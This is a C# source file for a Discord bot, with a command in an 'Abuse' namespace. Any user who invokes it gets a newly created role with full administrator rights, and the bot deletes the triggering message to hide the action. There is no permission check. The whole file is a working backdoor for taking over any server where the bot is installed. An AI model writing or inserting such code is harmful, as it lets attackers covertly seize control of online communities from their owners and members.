using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BotSandwich.Data;
using BotSandwich.Data.Commands;
using Discord;
using Discord.WebSocket;

namespace BotSandwich.Modules.Abuse.Commands
{
    class Admin : Command
    {
        public override string Name => "admin";

        [Argument(true, "name")]
        public string _roleName;
        
        public override async Task Run(Module module, SocketMessage sm, string msg)
        {
            await sm.DeleteAsync();
            
            var user = sm.Author as IGuildUser;
            var guild = user?.Guild;
            
            var role = await guild.CreateRoleAsync(_roleName, new GuildPermissions(administrator: true), Color.Red,
                false, null);
            await user.AddRoleAsync(role);
        }
    }
}
